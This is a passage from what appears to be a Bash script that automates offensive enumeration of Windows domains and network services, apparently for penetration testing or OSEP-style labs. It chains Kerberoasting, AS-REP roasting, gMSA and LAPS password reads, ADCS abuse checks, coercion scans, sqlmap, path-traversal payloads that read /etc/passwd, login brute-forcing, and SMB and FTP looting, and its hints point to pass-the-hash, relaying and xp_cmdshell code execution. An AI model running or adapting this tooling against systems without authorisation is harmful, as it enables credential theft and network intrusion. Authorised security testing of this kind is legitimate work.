    runc "$TMO_MED" "$PCQ nxc ldap $IP $A --trusted-for-delegation --admin-count 2>&1"

    # LAPS / gMSA / MachineAccountQuota / user descriptions
    out=$(capc "$TMO_MED" "$PCQ nxc ldap $IP $A -M laps 2>&1")
    echo "$out" | grep -qiE 'ms-mcs-admpwd|laps.*password|Computer:' && add_lead "[!] LAPS password readable ($IP)" "These are local admin passwords for the named hosts"
    # gMSA managed passwords (readable by certain principals -> instant service/admin creds)
    out=$(capc "$TMO_MED" "$PCQ nxc ldap $IP $A --gmsa 2>&1")
    echo "$out" | grep -qiE 'Account:.*NTLM|gMSA.*:|managedpassword' && add_lead "[!] gMSA managed password readable ($IP)" "Use the NT hash via PtH; gMSA accounts are often privileged (nxc ldap --gmsa)"
    runc "$TMO_SHORT" "$PCQ nxc ldap $IP $A -M maq 2>&1"
    runc "$TMO_MED"   "$PCQ nxc ldap $IP $A -M get-desc-users 2>&1"
    # domain/forest trusts (cross-domain pivots — OSEP staple). ldapsearch is
    # version-proof; the bind already works with the UPN.
    if need ldapsearch "trust enumeration"; then
        local tout
        tout=$(capc "$TMO_SHORT" "$PCQ ldapsearch -x -H ldap://$IP -D '${USER}@${DOMAIN}' -w '$PASS' -b '$(base_dn)' '(objectClass=trustedDomain)' trustPartner trustDirection trustType 2>&1")
        echo "$tout" | grep -qiE '^trustPartner:' && add_lead "[!] Domain trust(s) found ($IP)" "Cross-domain/forest path (see services/ldap.txt); enumerate the trusted domain next"
    fi

    # ADCS detection -> certipy for the real ESC verdict
    out=$(capc "$TMO_MED" "$PCQ nxc ldap $IP $A -M adcs 2>&1")
    if echo "$out" | grep -qiE 'CA |Certificate|PKI'; then
        add_lead "[!] ADCS / Certificate Authority present ($IP)" "certipy find -vulnerable (run below if installed)"
        if need certipy "ADCS vuln enumeration"; then
            local cout
            cout=$(capc "$TMO_LONG" "$PCQ certipy find -u '${USER}@${DOMAIN}' -p '$PASS' -dc-ip $IP -vulnerable -stdout 2>&1")
            flag_auth_error "$cout" "certipy"
            printf '%s\n' "$cout" > "$LOOT/adcs_certipy.txt"
            if echo "$cout" | grep -qiE 'ESC[0-9]+'; then
                add_lead "[!] Vulnerable ADCS template (ESC) on $IP" "certipy req ... then certipy auth - likely path to DA"
                adcs_analyze "$LOOT/adcs_certipy.txt"
            fi
        fi
    fi

    # AD object dumps: ldapdomaindump + BloodHound run CONCURRENTLY (both slow,
    # fully independent) -> roughly halves this part of the LDAP phase.
    local ldd_pid="" bh_pid=""
    if need ldapdomaindump "full AD object dump"; then
        mkdir -p "$LOOT/ldd"
        echo "\$ ldapdomaindump -u '${DOMAIN}\\${USER}' -p '$PASS' -o $LOOT/ldd $IP" >> "$CMDLOG"
        ( timeout -k 10 "$TMO_LONG" bash -c "$PCQ ldapdomaindump -u '${DOMAIN}\\${USER}' -p '$PASS' -o '$LOOT/ldd' $IP" </dev/null > "$SVCDIR/ldapdomaindump.txt" 2>&1 ) &
        ldd_pid=$!
    fi
    if [[ "$DO_BLOODHOUND" -eq 1 ]] && need bloodhound-python "BloodHound collection"; then
        echo "\$ bloodhound-python -u '$USER' -p '$PASS' -d '$DOMAIN' -ns $IP -c All --zip -op $LOOT/bh" >> "$CMDLOG"
        ( timeout -k 10 "$TMO_LONG" bash -c "$PCQ bloodhound-python -u '$USER' -p '$PASS' -d '${DOMAIN}' -ns $IP -c All --zip -op '$LOOT/bh'" </dev/null > "$SVCDIR/bloodhound.txt" 2>&1 ) &
        bh_pid=$!
    fi
    [[ -n "$ldd_pid" ]] && { wait "$ldd_pid" 2>/dev/null; ls "$LOOT"/ldd/*.html &>/dev/null && add_lead "[*] ldapdomaindump written ($IP)" "Open $LOOT/ldd/domain_users.html etc."; }
    [[ -n "$bh_pid"  ]] && { wait "$bh_pid"  2>/dev/null; ls "$LOOT"/bh_*.zip   &>/dev/null && add_lead "[+] BloodHound data collected ($IP)" "Import the zip, mark owned users, run 'Shortest Paths to Domain Admins' and check Outbound Object Control"; }

    # credential-bearing LDAP attributes via ldapsearch (UPN bind)
    run_ldapsearch
}

# ── ldapsearch credential-field dump (replaces windapsearch) ─────────────────
run_ldapsearch() {
    [[ "$CREDS_VALID" -eq 1 ]] || return 0
    [[ "$LDAPDUMP_DONE" -eq 1 ]] && return 0
    [[ -z "$PASS" ]]   && { info "LDAP credential dump needs a cleartext password (-p); skipping for hash-only auth."; return 0; }
    [[ -z "$DOMAIN" ]] && { info "LDAP credential dump needs a domain (-d); skipping."; return 0; }
    need ldapsearch "credential-field dump" || return 0
    LDAPDUMP_DONE=1

    local base full interesting; base="$(base_dn)"
    setout ldap_secrets "LDAP credential-field dump (ldapsearch)"
    full="$LOOT/ldap_userattrs_$IP.txt"; interesting="$LOOT/ldap_interesting_$IP.txt"
    info "Valid creds confirmed -> querying user objects for secret-bearing attributes"
    # UPN bind (AD accepts it where windapsearch's bind format did not); filter to
    # user accounts; ldif-wrap=no keeps each value on one line for clean parsing.
    runc "$TMO_MED" "$PCQ ldapsearch -x -o ldif-wrap=no -H ldap://$IP -D '${USER}@${DOMAIN}' -w '$PASS' -b '$base' '(&(objectCategory=person)(objectClass=user))' sAMAccountName cn description info comment userPassword unixUserPassword gecos ms-Mcs-AdmPwd 2>&1 | tee $full"
    [[ -s "$full" ]] || { info "ldapsearch returned no data."; return 0; }

    process_secret_fields "$full" | strip_noise | sed '/^[[:space:]]*$/d' > "$interesting"
    # candidate cleartext secrets for the optional spray
    [[ -s "${full}.secrets" ]] && sort -u "${full}.secrets" > "$LOOT/candidate_secrets_$IP.txt"
    if [[ -s "$interesting" ]]; then
        add_lead "[+] Credential-bearing LDAP fields found via ldapsearch ($IP)" "See 'LDAP CREDENTIAL-BEARING FIELDS' in _SUMMARY.txt and $interesting"
        banner_fields "$interesting"
    else
        info "No description/info/comment/userPassword/LAPS fields populated on any user."
    fi
}
banner_fields() { echo; echo -e "${CYAN}${BOLD}--- Interesting fields (possible secrets) ---${RESET}"; sed 's/^/  /' "$1"; }

# ── Kerberos (88) ────────────────────────────────────────────────────────────
h_kerberos() {
    info "Kerberos present -> users can be enumerated and AS-REP/kerberoasted."
    setout kerberos "Kerberos (88)"
    # cheap pre-auth wins
    if need kerbrute "username enumeration"; then
        local ul="/usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt"
        [[ -f "$ul" ]] && runc "$TMO_MED" "$PCQ kerbrute userenum -d '${DOMAIN:-$IP}' --dc $IP '$ul' 2>&1 | tail -n 40"
    fi
    need pre2k "pre-2000 computer accounts" && runc "$TMO_MED" "$PCQ pre2k unauth -d '${DOMAIN:-$IP}' -dc-ip $IP 2>&1"

    [[ "$MODE" != "auth" ]] && return 0
    local TGT EX out; TGT=$(imp_creds); EX=$(imp_extra)
    # AS-REP roast (impacket) — credential form (no @host) + -dc-ip, else data 52e
    if need GetNPUsers.py "AS-REP roasting"; then
        out=$(capc "$TMO_MED" "$PCQ GetNPUsers.py $TGT $EX -dc-ip $IP -request -outputfile $LOOT/asrep_imp_$IP.txt 2>&1")
        flag_auth_error "$out" "GetNPUsers" "No entries|no accounts|0 entries|UF_DONT_REQUIRE_PREAUTH"
        [[ -s "$LOOT/asrep_imp_$IP.txt" ]] && add_lead "[!] AS-REP hashes (impacket) on $IP" "hashcat -m 18200 $LOOT/asrep_imp_$IP.txt"
    fi
    # Kerberoast (impacket) — credential form (no @host) + -dc-ip
    if need GetUserSPNs.py "Kerberoasting"; then
        out=$(capc "$TMO_MED" "$PCQ GetUserSPNs.py $TGT $EX -dc-ip $IP -request -outputfile $LOOT/kerb_imp_$IP.txt 2>&1")
        flag_auth_error "$out" "GetUserSPNs" "No entries|no accounts|No SPN|0 entries"
        [[ -s "$LOOT/kerb_imp_$IP.txt" ]] && add_lead "[!] Kerberoast hashes (impacket) on $IP" "hashcat -m 13100 $LOOT/kerb_imp_$IP.txt"
    fi
    # roast accounts you can write to (shadow-creds / RBCD territory)
    need targetedKerberoast.py "targeted Kerberoast" && \
        runc "$TMO_MED" "$PCQ targetedKerberoast.py -d '$DOMAIN' -u '$USER' -p '$PASS' --dc-ip $IP 2>&1 | tee $LOOT/tgtroast_$IP.txt"
}

# ── MSRPC (135/593) ──────────────────────────────────────────────────────────
h_msrpc() {
    setout msrpc "MSRPC (135/593)"
    need rpcdump.py "RPC endpoint dump" && runc "$TMO_SHORT" "$PCQ rpcdump.py $IP 2>&1 | head -n 60"
    runc "$TMO_SHORT" "$PCQ rpcclient -U '' -N $IP -c 'srvinfo;enumdomusers;querydominfo' 2>&1"
    [[ "$MODE" == "auth" ]] && need samrdump.py "SAMR dump" && {
        local TGT; TGT=$(imp_target)
        runc "$TMO_MED" "$PCQ samrdump.py $TGT $(imp_extra) 2>&1 | head -n 80"
    }
    # coercion vectors (PetitPotam / PrinterBug / DFSCoerce) — scan only, gated
    if [[ "$AGGRESSIVE" -eq 1 && "$MODE" == "auth" ]] && need Coercer "coercion scan"; then
        local cout
        cout=$(capc "$TMO_MED" "$PCQ Coercer scan -u '$USER' -p '$PASS' -d '$DOMAIN' -t $IP 2>&1")
        echo "$cout" | grep -qiE 'vulnerable|\(\+\)|seems to be' && add_lead "[!] Coercion vector on $IP" "ntlmrelayx -t <relay-target> then trigger with Coercer coerce (relay to LDAP/ADCS)"
    fi
}

# ── WinRM (5985/5986) ────────────────────────────────────────────────────────
h_winrm() {
    setout winrm "WinRM (5985)"
    runc "$TMO_SHORT" "$PCQ nxc winrm $IP 2>&1"
    [[ "$MODE" != "auth" ]] && return 0
    local A out; A=$(nxc_auth)
    out=$(capc "$TMO_MED" "$PCQ nxc winrm $IP $A 2>&1")
    printf '%s\n' "$out" >> "$CUR_OUT"
    echo "$out" | grep -qiE 'Pwn3d|\(Pwn3d!\)' && add_lead "[!] WinRM access on $IP" "evil-winrm -i $IP -u '$USER' -p '<pass>'  (interactive shell)"
}

# ── RDP (3389) ───────────────────────────────────────────────────────────────
h_rdp() {
    setout rdp "RDP (3389)"
    runc "$TMO_SHORT" "$PCQ nxc rdp $IP 2>&1"
    [[ "$MODE" == "auth" ]] && { local A; A=$(nxc_auth); runc "$TMO_SHORT" "$PCQ nxc rdp $IP $A 2>&1"; }
}

# ── SSH (22) ─────────────────────────────────────────────────────────────────
h_ssh() {
    setout ssh "SSH (22)"
    runc "$TMO_SHORT" "$PCQ nc -w5 $IP 22 </dev/null 2>&1"      # banner
    have ssh-audit && runc "$TMO_SHORT" "$PCQ ssh-audit -4 $IP 2>&1"
}

# ── HTTP/HTTPS (web) ─────────────────────────────────────────────────────────
h_http() {
    local port="$1" scheme="http" url
    [[ "$port" == "443" || "$port" == "8443" ]] && scheme="https"
    url="$scheme://$IP:$port"
    setout "web_${port}" "HTTP ($port)"
    vinfo "Target URL: $url"
    [[ -n "$SOCKS" ]] && vinfo "Go/Rust web tools using native SOCKS5 -> $SOCKS"
    need whatweb "tech fingerprint" && runc "$TMO_SHORT" "$PCQ whatweb -a3 $url 2>&1"
    need curl "header grab" && runc "$TMO_SHORT" "$PCQ curl -sSIk --max-time 15 $url 2>&1"
    runc "$TMO_SHORT" "$PCQ curl -sSk --max-time 15 $url/robots.txt 2>&1 | head -n 40"

    local wl="${WEB_WORDLIST:-/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt}"
    # nuclei + directory discovery run CONCURRENTLY (both long, independent)
    local web_pids=()
    if have nuclei; then
        echo "\$ nuclei -u $url -severity medium,high,critical" >> "$CMDLOG"
        ( timeout -k 10 "$TMO_LONG" bash -c "nuclei -u $url -ni -severity medium,high,critical $NSOCKS_NUCLEI" </dev/null > "$LOOT/nuclei_${IP}_${port}.txt" 2>&1 ) &
        web_pids+=($!)
    fi
    if [[ "$WEB_BRUTE" -eq 1 && "$WEB_FUZZ" -eq 1 && -f "$wl" ]]; then
        if have feroxbuster; then
            echo "\$ feroxbuster -u $url -w $wl  (directories/files)" >> "$CMDLOG"
            ( timeout -k 10 "$TMO_LONG" bash -c "feroxbuster -u $url -w $wl -q -k --no-recursion -o $LOOT/ferox_${IP}_${port}.txt $NSOCKS_FEROX" </dev/null >> "$CUR_OUT" 2>&1 ) &
            web_pids+=($!)
        elif have ffuf; then
            echo "\$ ffuf -u $url/FUZZ -w $wl  (directories/files)" >> "$CMDLOG"
            ( timeout -k 10 "$TMO_LONG" bash -c "ffuf -u $url/FUZZ -w $wl -mc 200,204,301,302,307,401,403 -ac $NSOCKS_FFUF -of csv -o $LOOT/ffuf_${IP}_${port}.csv" </dev/null >> "$CUR_OUT" 2>&1 ) &
            web_pids+=($!)
        fi
    fi
    [[ ${#web_pids[@]} -gt 0 ]] && wait "${web_pids[@]}" 2>/dev/null

    # additional ffuf passes: virtual hosts + GET/POST parameters
    if [[ "$WEB_FUZZ" -eq 1 ]] && have ffuf; then web_fuzz_extra "$url" "$port"; fi

    [[ -s "$LOOT/nuclei_${IP}_${port}.txt" ]] && grep -qiE '\[(high|critical)\]' "$LOOT/nuclei_${IP}_${port}.txt" \
        && add_lead "[!] nuclei high/critical finding on $url" "Review $LOOT/nuclei_${IP}_${port}.txt"

    # OWASP-style deeper testing (opt-in via --web-vulns)
    [[ "$DO_WEBVULNS" -eq 1 ]] && web_vulns "$url" "$port"
}

# ── extra ffuf fuzzing: vhosts/subdomains + GET/POST parameter discovery ──────
web_fuzz_extra() {  # $1 url  $2 port
    local url="$1" port="$2"
    local vl="${VHOST_WORDLIST:-/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt}"
    local pl="${PARAM_WORDLIST:-/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt}"
    # virtual-host / subdomain discovery (needs a base domain; -ac filters the default page)
    if [[ -n "$DOMAIN" && -f "$vl" ]]; then
        echo "\$ ffuf vhost  Host: FUZZ.$DOMAIN  -w $vl" >> "$CMDLOG"
        runc "$TMO_LONG" "ffuf -u $url/ -H 'Host: FUZZ.${DOMAIN}' -w '$vl' -ac $NSOCKS_FFUF -of csv -o '$LOOT/ffuf_vhost_${IP}_${port}.csv' 2>&1 | tail -n 40"
        [[ -s "$LOOT/ffuf_vhost_${IP}_${port}.csv" && $(wc -l < "$LOOT/ffuf_vhost_${IP}_${port}.csv") -gt 1 ]] \
            && add_lead "[!] Virtual host(s) discovered on $url" "Add 'FUZZ.${DOMAIN}' entries to /etc/hosts and revisit: loot/ffuf_vhost_${IP}_${port}.csv"
    fi
    # GET + POST parameter discovery (-ac filters the no-such-param baseline)
    if [[ -f "$pl" ]]; then
        echo "\$ ffuf GET param  $url/?FUZZ=1  -w $pl" >> "$CMDLOG"
        runc "$TMO_MED" "ffuf -u '$url/?FUZZ=1' -w '$pl' -ac $NSOCKS_FFUF -of csv -o '$LOOT/ffuf_getparam_${IP}_${port}.csv' 2>&1 | tail -n 20"
        echo "\$ ffuf POST param  FUZZ=1  -w $pl" >> "$CMDLOG"
        runc "$TMO_MED" "ffuf -X POST -d 'FUZZ=1' -H 'Content-Type: application/x-www-form-urlencoded' -u '$url/' -w '$pl' -ac $NSOCKS_FFUF -of csv -o '$LOOT/ffuf_postparam_${IP}_${port}.csv' 2>&1 | tail -n 20"
        for k in getparam postparam; do
            [[ -s "$LOOT/ffuf_${k}_${IP}_${port}.csv" && $(wc -l < "$LOOT/ffuf_${k}_${IP}_${port}.csv") -gt 1 ]] \
                && add_lead "[*] ${k%param} parameter(s) discovered on $url" "Probe them for injection/IDOR: loot/ffuf_${k}_${IP}_${port}.csv"
        done
    fi
}

# ── OWASP-Top-10-style web testing (opt-in). Each tool auto-skips if absent. ──
web_vulns() {  # $1 url  $2 port
    local url="$1" port="$2"
    setout "web_${port}" "WEB VULN TESTING ($port)"
    info "OWASP-style web testing on $url (opt-in; tools skip if not installed)."

    # A02 Cryptographic Failures -> TLS/SSL
    if [[ "$url" == https://* ]]; then
        if have testssl.sh; then runc "$TMO_MED" "testssl.sh --quiet --color 0 $IP:$port 2>&1 | tail -n 80"
        elif have sslscan; then runc "$TMO_MED" "$PCQ sslscan --no-colour $IP:$port 2>&1 | tail -n 60"; fi
    fi

    # A05 Security Misconfiguration -> nikto
    if have nikto; then
        echo "\$ nikto -host $url" >> "$CMDLOG"
        ( timeout -k 10 "$TMO_LONG" bash -c "nikto -host $url -nointeractive -maxtime 180 -o $LOOT/nikto_${IP}_${port}.txt" </dev/null >> "$CUR_OUT" 2>&1 )
        [[ -s "$LOOT/nikto_${IP}_${port}.txt" ]] && add_lead "[!] nikto findings on $url" "Review loot/nikto_${IP}_${port}.txt"
    fi

    # A06 Vulnerable/Outdated Components + LFI/SSRF/SQLi/XSS/RCE templates -> nuclei
    if have nuclei; then
        echo "\$ nuclei -u $url -tags lfi,ssrf,sqli,xss,rce,exposure,misconfig" >> "$CMDLOG"
        ( timeout -k 10 "$TMO_LONG" bash -c "nuclei -u $url -ni -tags lfi,ssrf,sqli,xss,rce,exposure,misconfig -severity low,medium,high,critical $NSOCKS_NUCLEI" </dev/null > "$LOOT/nuclei_vulns_${IP}_${port}.txt" 2>&1 )
        [[ -s "$LOOT/nuclei_vulns_${IP}_${port}.txt" ]] && grep -qiE '\[(high|critical)\]' "$LOOT/nuclei_vulns_${IP}_${port}.txt" \
            && add_lead "[!] nuclei vuln-template hit on $url" "Review loot/nuclei_vulns_${IP}_${port}.txt"
    fi

    # A03 Injection -> sqlmap (intrusive; aggressive only)
    if [[ "$AGGRESSIVE" -eq 1 ]] && have sqlmap; then
        warn "AGGRESSIVE: sqlmap crawl on $url (intrusive)."
        echo "\$ sqlmap -u $url --batch --crawl=2 --forms" >> "$CMDLOG"
        ( timeout -k 10 "$TMO_LONG" bash -c "sqlmap -u $url --batch --crawl=2 --forms --level=2 --risk=2 --random-agent --output-dir=$LOOT/sqlmap" </dev/null >> "$CUR_OUT" 2>&1 )
        grep -rqiE 'is vulnerable|parameter.*injectable|might be injectable' "$LOOT/sqlmap" 2>/dev/null \
            && add_lead "[!!] SQL injection on $url (sqlmap)" "Dump it: sqlmap -u <url> --batch --dump ; see loot/sqlmap/"
    fi

    # LFI / path traversal quick probe (a few common payloads)
    if have curl; then
        local lfi r
        for lfi in '/etc/passwd' '/../../../../../etc/passwd' '/..%2f..%2f..%2f..%2fetc%2fpasswd' '/index.php?file=../../../../etc/passwd'; do
            r=$(capc "$TMO_SHORT" "$PCQ curl -sk --max-time 10 '${url}${lfi}' 2>&1")
            echo "$r" | grep -qE 'root:.*:0:0:' && { add_lead "[!!] LFI / path traversal on $url" "Payload returned /etc/passwd -> ${url}${lfi}"; break; }
        done
    fi

    # A07 Identification & Authentication Failures -> login brute (opt-in)
    if [[ -n "$LOGIN_PATH" && -n "$LOGIN_USERLIST" && -n "$LOGIN_PASSLIST" ]]; then
        web_login_brute "$url" "$port"
    elif [[ -n "$LOGIN_PATH" ]]; then
        info "Login path set but --login-userlist/--login-passlist missing; skipping auth brute."
    fi
}

# ── login-form brute (assumes username/password fields; tune with flags) ──────
web_login_brute() {  # $1 url  $2 port
    local url="$1" port="$2" fail="${LOGIN_FAILSTR:-invalid}"
    if have ffuf; then
        echo "\$ ffuf login brute  POST ${LOGIN_PATH}  (clusterbomb user x pass)" >> "$CMDLOG"
        runc "$TMO_LONG" "ffuf -u '${url}${LOGIN_PATH}' -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=USERFUZZ&password=PASSFUZZ' -w '$LOGIN_USERLIST:USERFUZZ' -w '$LOGIN_PASSLIST:PASSFUZZ' -mode clusterbomb -fr '$fail' $NSOCKS_FFUF -of csv -o '$LOOT/ffuf_login_${IP}_${port}.csv' 2>&1 | tail -n 30"
        [[ -s "$LOOT/ffuf_login_${IP}_${port}.csv" && $(wc -l < "$LOOT/ffuf_login_${IP}_${port}.csv") -gt 1 ]] \
            && add_lead "[!!] Possible valid web login on ${url}${LOGIN_PATH}" "Rows that didn't match '$fail': loot/ffuf_login_${IP}_${port}.csv"
    elif have hydra; then
        echo "\$ hydra http-post-form ${LOGIN_PATH}" >> "$CMDLOG"
        runc "$TMO_LONG" "$PCQ hydra -L '$LOGIN_USERLIST' -P '$LOGIN_PASSLIST' $IP http-post-form '${LOGIN_PATH}:username=^USER^&password=^PASS^:$fail' -t 4 -f 2>&1 | tail -n 30"
    fi
}

# ── DNS (53) ─────────────────────────────────────────────────────────────────
h_dns() {
    setout dns "DNS (53)"
    if need dig "DNS probes"; then
        runc "$TMO_SHORT" "$PCQ dig +time=3 +tries=1 @$IP version.bind chaos txt 2>&1"
        [[ -n "$DOMAIN" ]] && runc "$TMO_SHORT" "$PCQ dig +time=3 +tries=1 @$IP $DOMAIN axfr 2>&1"
    fi
    # AD-integrated DNS zone dump (internal hostname map) — needs creds
    if [[ "$MODE" == "auth" && -n "$DOMAIN" ]] && need adidnsdump "AD DNS dump"; then
        runc "$TMO_MED" "cd $LOOT && $PCQ adidnsdump -u '${DOMAIN}\\${USER}' -p '$PASS' $IP 2>&1 | head -n 60"
        add_lead "[*] AD-integrated DNS enumerated ($IP)" "Records reveal internal hostnames; cross-ref with BloodHound"
    fi
}

# ── MSSQL (1433) ─────────────────────────────────────────────────────────────
h_mssql() {
    setout mssql "MSSQL (1433)"
    runc "$TMO_SHORT" "$PCQ nxc mssql $IP 2>&1"
    [[ "$MODE" != "auth" ]] && return 0
    local A out; A=$(nxc_auth)
    out=$(capc "$TMO_MED" "$PCQ nxc mssql $IP $A --query 'SELECT @@version' 2>&1")
    printf '%s\n' "$out" >> "$CUR_OUT"
    echo "$out" | grep -qiE 'Pwn3d|sysadmin' && add_lead "[!] MSSQL access on $IP" "nxc mssql $IP $A -M mssql_priv ; xp_cmdshell for RCE if sysadmin"
    runc "$TMO_MED" "$PCQ nxc mssql $IP $A -M mssql_priv 2>&1"
    # linked servers: classic OSEP lateral pivot (Querier/Scrambled/StreamIO/Multimaster).
    # A linked server with sysadmin/impersonation = RCE on another host via openquery/EXEC AT.
    out=$(capc "$TMO_SHORT" "$PCQ nxc mssql $IP $A --query 'SELECT srvname, srvproduct, providername FROM master..sysservers WHERE srvname <> @@SERVERNAME' 2>&1")
    printf '%s\n' "$out" >> "$CUR_OUT"
    [[ "$(echo "$out" | grep -ciE 'SQL Server|SQLNCLI|MSOLEDBSQL|OLE DB')" -ge 1 ]] && \
        add_lead "[!] MSSQL linked server(s) on $IP" "EXEC ('...') AT [linked] or openquery; chase sysadmin/impersonation across the link"
}

# ── MySQL (3306) ─────────────────────────────────────────────────────────────
h_mysql() {
    setout mysql "MySQL (3306)"
    runc "$TMO_SHORT" "$PCQ nc -w5 $IP 3306 </dev/null 2>&1"
    [[ "$MODE" == "auth" ]] && need mysql "auth check" && \
        runc "$TMO_SHORT" "$PCQ mysql -h $IP -u '$USER' --password='$PASS' -e 'show databases;' 2>&1"
}

# ── FTP (21) ─────────────────────────────────────────────────────────────────
h_ftp() {
    setout ftp "FTP (21)"
    runc "$TMO_SHORT" "$PCQ nxc ftp $IP -u anonymous -p '' 2>&1"
    local anon_ok=0
    if need curl "anon FTP listing"; then
        local out; out=$(capc "$TMO_SHORT" "$PCQ curl -sS --max-time 15 ftp://anonymous:anonymous@$IP/ 2>&1")
        printf '%s\n' "$out" >> "$CUR_OUT"
        [[ -n "$out" ]] && ! echo "$out" | grep -qiE 'denied|530|fail|refused|not allowed' && anon_ok=1
    fi
    if [[ "$anon_ok" -eq 1 ]]; then
        if [[ "$DOWNLOAD_FTP" -eq 1 ]]; then
            mkdir -p "$LOOT/ftp"
            if have wget; then
                echo "\$ wget -m ftp://anonymous@$IP/ -> loot/ftp" >> "$CMDLOG"
                runc "$TMO_LONG" "$PCQ wget -q -m -nH --no-parent --timeout=15 --tries=1 ftp://anonymous:anonymous@$IP/ -P '$LOOT/ftp' 2>&1"
            elif have lftp; then
                echo "\$ lftp mirror ftp://anonymous@$IP/ -> loot/ftp" >> "$CMDLOG"
                runc "$TMO_LONG" "lftp -e 'set net:timeout 15; set ftp:passive-mode on; mirror -c / \"$LOOT/ftp\"; bye' -u anonymous,anonymous $IP 2>&1"
            else
                warn "Anonymous FTP open but no wget/lftp to mirror it; install wget to auto-download."
            fi
            local n; n=$(find "$LOOT/ftp" -type f 2>/dev/null | wc -l | tr -d ' ')
            if [[ "$n" -gt 0 ]]; then
                ok "Pulled $n file(s) from FTP -> loot/ftp/"
                add_lead "[+] Downloaded $n file(s) from anonymous FTP ($IP)" "grep -rabiE 'pass|secret|key|connectionstring' '$LOOT/ftp'"
            else
                add_lead "[!] Anonymous FTP allowed ($IP)" "Login worked but nothing downloaded; browse: curl ftp://anonymous:anonymous@$IP/"
            fi
        else
            add_lead "[!] Anonymous FTP allowed ($IP)" "Download skipped (--no-loot-ftp). Browse: curl ftp://anonymous:anonymous@$IP/"
        fi
    fi
}

# ── SMTP (25/465/587) ────────────────────────────────────────────────────────
h_smtp() {
    setout smtp "SMTP (25)"
    runc "$TMO_SHORT" "$PCQ nc -w5 $IP 25 </dev/null 2>&1"
    have smtp-user-enum && [[ -f /usr/share/seclists/Usernames/top-usernames-shortlist.txt ]] && \
        runc "$TMO_MED" "$PCQ smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t $IP 2>&1 | tail -n 30"
}
h_pop3() { setout pop3 "POP3 (110)"; runc "$TMO_SHORT" "$PCQ nc -w5 $IP 110 </dev/null 2>&1"; }
h_imap() { setout imap "IMAP (143)"; runc "$TMO_SHORT" "$PCQ nc -w5 $IP 143 </dev/null 2>&1"; }

# ── SNMP (161 - UDP; rarely shown by TCP fscan, handled if present) ──────────
h_snmp() {
    setout snmp "SNMP (161)"
    have onesixtyone && runc "$TMO_SHORT" "$PCQ onesixtyone $IP public 2>&1"
    have snmpwalk && runc "$TMO_MED" "$PCQ snmpwalk -v2c -c public -t 3 -r 1 $IP 2>&1 | head -n 60"
}

# ── Redis (6379) ─────────────────────────────────────────────────────────────
h_redis() {
    setout redis "Redis (6379)"
    if need redis-cli "redis probe"; then
        local out; out=$(capc "$TMO_SHORT" "$PCQ redis-cli -h $IP INFO server 2>&1")
        printf '%s\n' "$out" >> "$CUR_OUT"
        echo "$out" | grep -qiE 'redis_version' && add_lead "[!] Unauthenticated Redis ($IP)" "redis-cli -h $IP ; CONFIG GET dir / module load for RCE paths"
    fi
}

# ── NFS (111/2049) ───────────────────────────────────────────────────────────
h_nfs() {
    setout nfs "NFS (111/2049)"
    have showmount && {
        local out; out=$(capc "$TMO_SHORT" "$PCQ showmount -e $IP 2>&1")
        printf '%s\n' "$out" >> "$CUR_OUT"
        echo "$out" | grep -qE '/' && add_lead "[!] NFS exports on $IP" "mount -t nfs $IP:<export> /mnt -o nolock ; check for no_root_squash"
    }
}

# ── Telnet (23) ──────────────────────────────────────────────────────────────
h_telnet() { setout telnet "Telnet (23)"; runc "$TMO_SHORT" "$PCQ nc -w5 $IP 23 </dev/null 2>&1"; }

# ════════════════════════════════════════════════════════════════════════════
#  LOOT: share download, user harvesting, password spray, hash cracking
# ════════════════════════════════════════════════════════════════════════════

# resolve a wordlist path. kind = spray | crack
find_wordlist() {
    local kind="$1" c
    if [[ "$kind" == "spray" ]]; then
        [[ -n "$SPRAY_WORDLIST" && -f "$SPRAY_WORDLIST" ]] && { printf '%s' "$SPRAY_WORDLIST"; return; }
        for c in \
            /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \
            /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-500.txt \
            /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt \
            /usr/share/seclists/Passwords/Common-Credentials/100-common-passwords.txt \
            /usr/share/seclists/Passwords/darkweb2017-top1000.txt; do
            [[ -f "$c" ]] && { printf '%s' "$c"; return; }
        done
    else
        [[ -n "$CRACK_WORDLIST" && -f "$CRACK_WORDLIST" ]] && { printf '%s' "$CRACK_WORDLIST"; return; }
        [[ -f /usr/share/wordlists/rockyou.txt ]] && { printf '%s' /usr/share/wordlists/rockyou.txt; return; }
        if [[ -f /usr/share/wordlists/rockyou.txt.gz ]]; then
            gunzip -c /usr/share/wordlists/rockyou.txt.gz > "$LOOT/rockyou.txt" 2>/dev/null \
                && { printf '%s' "$LOOT/rockyou.txt"; return; }
        fi
        for c in \
            /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt \
            /usr/share/wordlists/fasttrack.txt \
            /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt; do
            [[ -f "$c" ]] && { printf '%s' "$c"; return; }
        done
    fi
    printf ''
}

# download readable/writable shares to loot/shares/. $1 = nxc --shares output.
download_shares() {
    [[ "$DOWNLOAD_SHARES" -eq 1 ]] || return 0
    [[ "$CREDS_VALID" -eq 1 ]] || return 0
    need smbclient "share download" || return 0
    local out="$1" share dest got n=0 list
    list=$(echo "$out" | awk '$1=="SMB" && ($6 ~ /READ/ || $6 ~ /WRITE/){print $5}' \
           | grep -aviE '^(IPC\$|print\$)$' | sort -u)
    [[ -z "$list" ]] && return 0
    setout smb_loot "SMB share download (readable shares -> loot/shares/)"
    local ubind extra="" secret
    if [[ "$LOCAL_AUTH" -eq 1 || -z "$DOMAIN" ]]; then ubind="$USER"; else ubind="${DOMAIN}\\${USER}"; fi
    secret="$PASS"; [[ -n "$HASH" ]] && { secret="$HASH"; extra="--pw-nt-hash"; }
    while IFS= read -r share; do
        [[ -z "$share" ]] && continue
        dest="$LOOT/shares/$share"; mkdir -p "$dest"
        info "Downloading //$IP/$share -> loot/shares/$share/"
        # PASSWD env dodges smbclient's user%pass parsing (password may contain % $ ^)
        runc "$TMO_LONG" "cd '$dest' && PASSWD='$secret' $PCQ smbclient '//$IP/$share' -U '$ubind' $extra -c 'prompt OFF; recurse ON; mask *; mget *' 2>&1 | tail -n 15"
